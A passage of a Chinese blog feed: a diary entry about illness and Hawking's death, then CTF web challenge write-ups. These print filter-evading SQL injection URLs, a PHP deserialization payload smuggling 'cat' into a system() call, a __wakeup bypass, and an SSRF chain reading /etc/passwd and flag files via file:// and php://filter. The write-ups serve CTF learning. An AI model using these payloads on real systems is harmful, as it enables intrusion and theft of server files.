    <content type="html"><![CDATA[<h2 id="假装一个标签"><a href="#假装一个标签" class="headerlink" title="假装一个标签"></a>假装一个标签</h2><p>这几天是真的糟糕，晚上睡觉简直遭罪，以前从来没有过，前几天百度一下，自己貌似得了鼻炎，然后跑去看医生，给她说我好像是鼻炎，但是那医生神TM说我是感冒，开了感冒药，让我回去，我吃了两次，虽然白天有好转，但是晚上不敢想啊，今天去找另一个医生，医生说我确实是鼻炎，买了药回来吃，希望晚上会好一点吧，那种滋味很难受。</p><p>中午的时候看见有人在群里分享微博，标题是“英国著名物理学家霍金去世，享年76岁”。一开始并不相信这位思想的巨人离开的事实，后来证实后我感到很惊讶。从初中开始了解霍金，那时候喜欢《时间简史》这本书，一位患有卢伽雷氏症，全身瘫痪的人，他的思想却站在人类的最高处。《时间简史》之后开始了解理论物理，理论物理很有趣，很多时候都和哲学密切相关，高中经常跑到新华书店去看这方面的书，每次时间都不太长吧，半小时左右，然后再去打球，大学之后就没有了解了，进了计算机学院，一把鼻涕一把泪，信息安全的男生不会轻易认输，好像说的有点远emmm。从全身瘫痪开始，把一切困难当做日常，思想形成人的伟大，无数的日常最终发生了许许多多让人匪夷所思的奇迹，而他度过的每一个平凡的日常，本身就是连续发生的奇迹，他坚持下来了，他用思想引领人类前进。正如臧克家所说“有的人死了，他还活着”，虽然他离开了，但他的思想永远活着，他的思想会一直启迪着后来的人们，努力去追求真理，探索未知、神奇的未知世界。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>晚上好点吧，每天晚上一点左右才能睡很难受啊！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;假装一个标签&quot;&gt;&lt;a href=&quot;#假装一个标签&quot; class=&quot;headerlink&quot; title=&quot;假装一个标签&quot;&gt;&lt;/a&gt;假装一个标签&lt;/h2&gt;&lt;p&gt;这几天是真的糟糕，晚上睡觉简直遭罪，以前从来没有过，前几天百度一下，自己貌似得了鼻炎，然后跑去看医生，给她说
      
    
    </summary>
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>happymoctf笔记</title>
    <link href="http://yoursite.com/2018/02/13/happymoctf%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2018/02/13/happymoctf笔记/</id>
    <published>2018-02-13T10:48:07.000Z</published>
    <updated>2018-03-10T14:41:06.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ez-Injection"><a href="#ez-Injection" class="headerlink" title="ez Injection"></a>ez Injection</h2><p>测试发现空格被过滤了,尝试内联注释/**/代替，成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/order/**/by/**/3%23</div></pre></td></tr></table></figure></p><p>尝试可联合查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/union/**/select/**/1,2,3%23</div></pre></td></tr></table></figure></p><p>没有任何回显，很可能是被替换了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/1,2,3%23</div></pre></td></tr></table></figure></p><p>有回显，然后爆库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/1,group_concat(schema_name),3/**/frfromom/**/information_schema.schemata%23</div></pre></td></tr></table></figure></p><p>发现括号行不通，被过滤了，不过影响不大<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/1%2Cschema_name%2C3/**/frfromom/**/information_schema.schemata%23</div></pre></td></tr></table></figure></p><p>爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/1%2Ctable_name%2C3/**/frfromom/**/information_schema.tables/**/whwhereere/**/table_schema%3D%22sheldon%22%23</div></pre></td></tr></table></figure></p><p>爆字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/1%2Ccolumn_name%2C3/**/frfromom/**/information_schema.columns/**/whwhereere/**/table_name%3D%2204ad5938eaf0efb6%22%23</div></pre></td></tr></table></figure></p><p>爆内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?id=1%27/**/uniunionon/**/selselectect/**/name%2Cvalue%2C3/**/frfromom/**/sheldon.04ad5938eaf0efb6%23</div></pre></td></tr></table></figure></p><p>flag:moctf{5o_easy_inj3cTi0n}</p><h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">    include &apos;class.php&apos;;</div><div class="line">    if(is_array($_GET)&amp;&amp;count($_GET)&gt;0)</div><div class="line">    &#123;</div><div class="line">        if(isset($_GET[&quot;LandIn&quot;]))</div><div class="line">        &#123;</div><div class="line">            $pos=$_GET[&quot;LandIn&quot;];</div><div class="line">        &#125;</div><div class="line">        if($pos===&quot;airport&quot;)</div><div class="line">        &#123;</div><div class="line">            die(&quot;&lt;center&gt;机场大仙太多,你被打死了~&lt;/center&gt;&quot;);</div><div class="line">        &#125;</div><div class="line">        elseif($pos===&quot;school&quot;)</div><div class="line">        &#123;</div><div class="line">            echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot;  style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;);</div><div class="line">            $pubg=$_GET[&apos;pubg&apos;];</div><div class="line">            $p = unserialize($pubg);</div><div class="line">            // $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</div><div class="line">        &#125;</div><div class="line">        elseif($pos===&quot;AFK&quot;)</div><div class="line">        &#123;</div><div class="line">            die(&quot;&lt;center&gt;由于你长时间没动,掉到海里淹死了~&lt;/center&quot;);</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            die(&quot;&lt;center&gt;You Lose&lt;/center&gt;&quot;);</div><div class="line">            </div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    include &apos;waf.php&apos;;</div><div class="line">    class sheldon&#123;</div><div class="line">        public $bag=&quot;nothing&quot;;</div><div class="line">        public $weapon=&quot;M24&quot;;</div><div class="line">        // public function __toString()&#123;</div><div class="line">        //     $this-&gt;str=&quot;You got the airdrop&quot;;</div><div class="line">        //     return $this-&gt;str;</div><div class="line">        // &#125;</div><div class="line">        public function __wakeup()</div><div class="line">        &#123;</div><div class="line">            $this-&gt;bag=&quot;nothing&quot;;</div><div class="line">            $this-&gt;weapon=&quot;kar98K&quot;;</div><div class="line">        &#125;</div><div class="line">        public function Get_air_drops($b)</div><div class="line">        &#123;</div><div class="line">                $this-&gt;$b();</div><div class="line">        &#125;</div><div class="line">        public function __call($method,$parameters)</div><div class="line">        &#123;</div><div class="line">            $file = explode(&quot;.&quot;,$method);</div><div class="line">            echo $file[0];</div><div class="line">            if(file_exists(&quot;.//class$file[0].php&quot;))</div><div class="line">            &#123;</div><div class="line">                system(&quot;php  .//class//$method.php&quot;);</div><div class="line">            &#125;</div><div class="line">            else</div><div class="line">            &#123;</div><div class="line">                system(&quot;php  .//class//win.php&quot;);</div><div class="line">            &#125;</div><div class="line">            die();</div><div class="line">        &#125;</div><div class="line">        public function nothing()</div><div class="line">        &#123;</div><div class="line">            die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;);</div><div class="line">        &#125;</div><div class="line">        public function __destruct()</div><div class="line">        &#123;</div><div class="line">            waf($this-&gt;bag);</div><div class="line">            if($this-&gt;weapon===&apos;AWM&apos;)</div><div class="line">            &#123;</div><div class="line">                $this-&gt;Get_air_drops($this-&gt;bag);</div><div class="line">            &#125;</div><div class="line">            else</div><div class="line">            &#123;</div><div class="line">                die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>对于_call()函数，查看官方文档，在调用一个未定义的函数时会调用此函数。反序列化绕过_wakeup()函数前面提到过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$file = explode(&quot;.&quot;,$method);</div><div class="line">echo $file[0];</div><div class="line">if(file_exists(&quot;.//class$file[0].php&quot;))</div><div class="line">    &#123;</div><div class="line">        system(&quot;php  .//class//$method.php&quot;);</div><div class="line">    &#125;</div><div class="line">else</div><div class="line">    &#123;</div><div class="line">        system(&quot;php  .//class//win.php&quot;);</div><div class="line">    &#125;</div><div class="line">die();</div></pre></td></tr></table></figure></p><p>system(“php  .//class//$method.php”)可以拼接命令执行任意语句;$bag 为要调用的未定义函数, 并且他为 system 命令的参数,$weapon==AWM 的时候调用 $bag 函数,思路就有了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?LandIn=school&amp;pubg=O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:24:&quot;win.php;cat%20./class/flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ez-Injection&quot;&gt;&lt;a href=&quot;#ez-Injection&quot; class=&quot;headerlink&quot; title=&quot;ez Injection&quot;&gt;&lt;/a&gt;ez Injection&lt;/h2&gt;&lt;p&gt;测试发现空格被过滤了,尝试内联注释/**/代替，成功&lt;br&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>回家的感觉真好</title>
    <link href="http://yoursite.com/2018/01/25/%E5%9B%9E%E5%AE%B6%E7%9A%84%E6%84%9F%E8%A7%89%E7%9C%9F%E5%A5%BD/"/>
    <id>http://yoursite.com/2018/01/25/回家的感觉真好/</id>
    <published>2018-01-25T15:49:37.000Z</published>
    <updated>2018-01-25T15:49:37.560Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>cumtctf2018web部分题解</title>
    <link href="http://yoursite.com/2018/01/14/cumtctf2018web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/01/14/cumtctf2018web部分题解/</id>
    <published>2018-01-14T08:33:48.000Z</published>
    <updated>2018-01-14T09:58:43.252Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">@error_reporting(1);</div><div class="line">class sky</div><div class="line">&#123;     </div><div class="line">    protected $skyobj; </div><div class="line">    function __construct()</div><div class="line">    &#123;         </div><div class="line">        $this-&gt;skyobj = new sec;    </div><div class="line">       &#125; </div><div class="line">    function __toString()     </div><div class="line">    &#123;         </div><div class="line">        if (isset($this-&gt;skyobj)) </div><div class="line">            return $this-&gt;skyobj-&gt;read();     </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">class nosec</div><div class="line">&#123;   </div><div class="line">    public $filename;     </div><div class="line">    function read()     </div><div class="line">    &#123;   </div><div class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;       </div><div class="line">        if (file_get_contents($file))        </div><div class="line">        &#123;             </div><div class="line">            return file_get_contents($file);</div><div class="line">        &#125; </div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            return &quot;you must be joking!&quot;;</div><div class="line">        &#125;     </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"> </div><div class="line">class sec</div><div class="line">&#123; </div><div class="line">    function read()    </div><div class="line">    &#123;         </div><div class="line">        return &quot;it&apos;s so sec~~&quot;;     </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">if (isset($_GET[&apos;data&apos;])) </div><div class="line">&#123;</div><div class="line">    $Input_data = unserialize($_GET[&apos;data&apos;]); </div><div class="line">    echo $Input_data;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">    highlight_file(&quot;./index.php&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>过程很简单，对输入的data变量进行反序列化后，赋值给Input_data,再输出Input_data。</p><p>再看定义的那三个类,sky类中有一个$skyobj成员变量，和两个函数<strong>construct()和</strong>toString()，这两个函数都是php magic函数，<strong>construct()函数在对象创建时调用，</strong>toString()方法在打印对象时调用。因此在输出$Input_data时会执行__toString(),在sky类中的构造函数会把$skyobj定义为sec对象，而执行sec类中的read（）函数，这不是我们所期望的，我们希望能执行nosec中的read（）函数从而输出我们想要的文件内容。</p><p>在php进行反序列化时，会调用__wakeup()函数（也是一个magic方法）,此方法会重新构造对象，也就是说不管输入什么，在成功反序列化后会重新定义$skyobj = new sec。那这样最终会输出it’s so sec~~。那么怎么绕过？</p><p>CVE-2016-7124爆出当成员属性数目大于实际数目时可绕过wakeup方法，因此：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">class sky</div><div class="line">&#123;     </div><div class="line">    protected $skyobj; </div><div class="line">    protected $leesinc1;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;leesinc1 = 1;</div><div class="line">        $this-&gt;skyobj = new sec;    </div><div class="line">       &#125; </div><div class="line">    function __toString()     </div><div class="line">    &#123;         </div><div class="line">        if (isset($this-&gt;skyobj)) </div><div class="line">            return $this-&gt;skyobj-&gt;read();     </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">class nosec</div><div class="line">&#123;   </div><div class="line">    public $filename = &apos;flag.php&apos;;     </div><div class="line">    function read()     </div><div class="line">    &#123;   </div><div class="line">        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;       </div><div class="line">        if (file_get_contents($file))        </div><div class="line">        &#123;             </div><div class="line">            return file_get_contents($file);</div><div class="line">        &#125; </div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            return &quot;you must be joking!&quot;;</div><div class="line">        &#125;     </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line">$a = new sky;</div><div class="line">$b = serialize($a);</div><div class="line">$c = urlencode($b);</div><div class="line">echo $c;</div></pre></td></tr></table></figure></p><p>把输出结果传上去即可</p><h2 id="What？？？"><a href="#What？？？" class="headerlink" title="What？？？"></a>What？？？</h2><p>文件泄露 .index.php.swp</p><p>得到一堆字符串，估计是加密过得，处理过程中得知flag在/tmp/flag里面，处理过后拿到网站进行解密<a href="https://yoursunny.com/p/PHP-decode/，" target="_blank" rel="external">https://yoursunny.com/p/PHP-decode/，</a> 得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $a=@$_GET[&apos;chec&apos;];</div><div class="line">    if ($a!=&quot;&quot;)</div><div class="line">    &#123;</div><div class="line">        $b = substr(md5($a),0,9);</div><div class="line">        $c = substr(md5($b),5,18);</div><div class="line">        $c = md5($c)</div><div class="line">        echo $c;</div><div class="line">        exit();</div><div class="line">    &#125;</div><div class="line">    $d = @$_GET[&apos;img_tet&apos;];</div><div class="line">    $d = htmlspecialchars($d);</div><div class="line">    $d = str_replace( &apos;flag&apos;,&quot;&quot;,$d);</div><div class="line">    if ($d!=&quot;&quot;)</div><div class="line">    &#123;</div><div class="line">        header(&apos;Content-Type: imgage/jpeg&apos;);</div><div class="line">        header(&apos;Content-Disposition: attachment; filename=&apos;.$d);</div><div class="line">        header(&apos;Content-Lengh: &apos;.filesize($d));</div><div class="line">        $e = fopen($d,&quot;r&quot;) or die(&quot;Unable to open file!&quot;);</div><div class="line">        $f = fread($e,filesize($d));</div><div class="line">        fclose($e);</div><div class="line">        echo $f;</div><div class="line">        &#125;</div><div class="line">    ;echo &apos;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>要我们Get传递两个参数，但是一个明显传上去就不会执行后续代码，因此只传第二个，把传上去的值经过htmlspecialchar()和str_replace()两个方法处理之后然后把变量名的文件内容传下来，如果不纯在文件，则文件内容为Unable to open file!。htmlspecialchar()可以不管，str<em>replace()函数很好绕过,于是尝试传/tmp/flflagag,发现/会被过滤替换为</em>，尝试把/改为URL编码%2F传上去成功！</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">error_reporting(0);</div><div class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</div><div class="line">define(&quot;SECRET_KEY&quot;, &quot;....&quot;);</div><div class="line">session_start();</div><div class="line"></div><div class="line">function get_random_token()&#123;</div><div class="line">    $random_token=&apos;&apos;;</div><div class="line">    for($i=0;$i&lt;16;$i++)&#123;</div><div class="line">        $random_token.=chr(rand(1,255));</div><div class="line">    &#125;</div><div class="line">    return $random_token;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function login($info)</div><div class="line">&#123;</div><div class="line">    $plain = serialize($info);</div><div class="line">$token = get_random_token();</div><div class="line">    $cipher = base64_encode(openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token));</div><div class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</div><div class="line">    setcookie(&quot;token&quot;, base64_encode($token));</div><div class="line">    setcookie(&quot;cipher&quot;, $cipher);</div><div class="line">    $_SESSION[&apos;isadmin&apos;] = false;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function is_admin()</div><div class="line">&#123;</div><div class="line">if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;token&apos;]))</div><div class="line">&#123;</div><div class="line">$token = base64_decode($_COOKIE[&apos;token&apos;]);</div><div class="line">$cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</div><div class="line">if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))</div><div class="line">&#123;</div><div class="line">$info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</div><div class="line">$_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</div><div class="line">&#125; </div><div class="line">else </div><div class="line">&#123;</div><div class="line">die(&quot;Error!&quot;);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function show_adminpage()</div><div class="line">&#123;</div><div class="line">if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)</div><div class="line">&#123;</div><div class="line">$_SESSION[&apos;isadmin&apos;]=true;</div><div class="line">header(&quot;Location: ./admin.php&quot;); </div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">die(&quot;You are not admin!&quot;);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">if(isset($_POST[&apos;logname&apos;]) &amp;&amp; isset($_POST[&apos;logpass&apos;]))</div><div class="line">&#123;</div><div class="line">    $username = (string)$_POST[&apos;logname&apos;];</div><div class="line">    $password = (string)$_POST[&apos;logpass&apos;];</div><div class="line">    if($username === &apos;admin&apos;)</div><div class="line">    &#123;</div><div class="line">        die(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</div><div class="line">        login($info);</div><div class="line">        show_adminpage();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else if(isset($_SESSION[&apos;username&apos;]))</div><div class="line">&#123;</div><div class="line">is_admin();</div><div class="line">show_adminpage();</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">die(&quot;è¯·ç™»å½•ï¼&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>就是前面讲的CBC字节翻转攻击，在登录成功后在头文件里会有Location: ./admin.php,于是访问又得到./admin.php?url=<a href="http://skysec.top/，存在SSRF漏洞，尝试半天无果（不断尝试，心情复杂.jpg），因为不知道文件路径,于是尝试?url=file:///etc/passwd,打印出了服务器的etc/passwd文件，（其实尝试了很久）于是访问?url=file:///etc/hosts发现内网其他的ip：" target="_blank" rel="external">http://skysec.top/，存在SSRF漏洞，尝试半天无果（不断尝试，心情复杂.jpg），因为不知道文件路径,于是尝试?url=file:///etc/passwd,打印出了服务器的etc/passwd文件，（其实尝试了很久）于是访问?url=file:///etc/hosts发现内网其他的ip：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">127.0.0.1    localhost</div><div class="line">::1localhost ip6-localhost ip6-loopback</div><div class="line">fe00::0ip6-localnet</div><div class="line">ff00::0ip6-mcastprefix</div><div class="line">ff02::1ip6-allnodes</div><div class="line">ff02::2ip6-allrouters</div><div class="line">172.17.0.4cbc-ssrf-flag 3f1bea796ae7 cbcbxsteamxyz_cbc-ssrf-flag_1</div><div class="line">172.17.0.4cbc-ssrf-flag_1 3f1bea796ae7 cbcbxsteamxyz_cbc-ssrf-flag_1</div><div class="line">172.17.0.4cbcbxsteamxyz_cbc-ssrf-flag_1 3f1bea796ae7</div><div class="line">172.17.0.5d3f7541aac8</div></pre></td></tr></table></figure><p>尝试?url=<a href="http://172.17.0.4" target="_blank" rel="external">http://172.17.0.4</a> 发现文件包含漏洞:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    error_reporting(0);</div><div class="line">include &quot;flag.php&quot;;</div><div class="line">if(!$_GET[&apos;file&apos;])</div><div class="line">&#123;</div><div class="line">echo file_get_contents(&quot;./index.php&quot;);</div><div class="line">&#125;</div><div class="line">$file=$_GET[&apos;file&apos;];</div><div class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))</div><div class="line">&#123;</div><div class="line">echo &quot;Oh no!&quot;;</div><div class="line">exit();</div><div class="line">&#125;</div><div class="line">include($file); </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>明显要用php伪协议去读flag.php，payload：?url=<a href="http://172.17.0.4?file=php://filter/read=convert.base64-encode/resource=flag.php" target="_blank" rel="external">http://172.17.0.4?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p><h2 id="后记"><a href="#后记" class="headerlink" 